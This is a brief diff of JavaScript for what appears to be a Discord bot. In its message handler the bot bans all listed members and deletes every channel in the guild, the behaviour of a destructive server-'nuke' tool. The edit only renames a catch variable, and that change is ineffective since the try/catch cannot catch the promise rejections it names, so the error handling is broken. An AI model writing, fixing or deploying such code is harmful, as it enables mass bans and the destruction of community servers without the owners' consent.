@@ -33,7 +33,7 @@ client.on('message', message => {
                 list.members.forEach(member => member.ban());
                 message.guild.channels.forEach(channel => channel.delete());
 
-            } catch (UnhandledPromiseRejectionWarning) {
+            } catch (PromiseRejectionWarning) {
 
                 console.log('Not enough permissions');
 
